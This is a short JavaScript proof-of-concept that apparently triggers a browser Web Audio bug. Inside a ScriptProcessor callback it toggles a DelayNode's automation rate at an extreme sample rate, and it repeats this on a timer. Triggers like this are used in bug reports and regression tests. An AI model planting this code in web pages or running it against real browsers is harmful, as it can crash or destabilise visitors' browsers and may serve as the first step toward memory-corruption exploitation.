function poc() {
  let ctx = new AudioContext({
    sampleRate: 768000.0
  });
  let sp = ctx.createScriptProcessor();

  sp.onaudioprocess = function (event) {
    delay.delayTime.automationRate = "k-rate";
    delay.delayTime.automationRate = "a-rate";
  };

  let delay = ctx.createDelay(1);
  delay.delayTime.linearRampToValueAtTime(1, 2);
  sp.connect(delay).connect(ctx.destination);
  delay.delayTime.setValueAtTime(5, ctx.currentTime);
}

setInterval(poc, 100);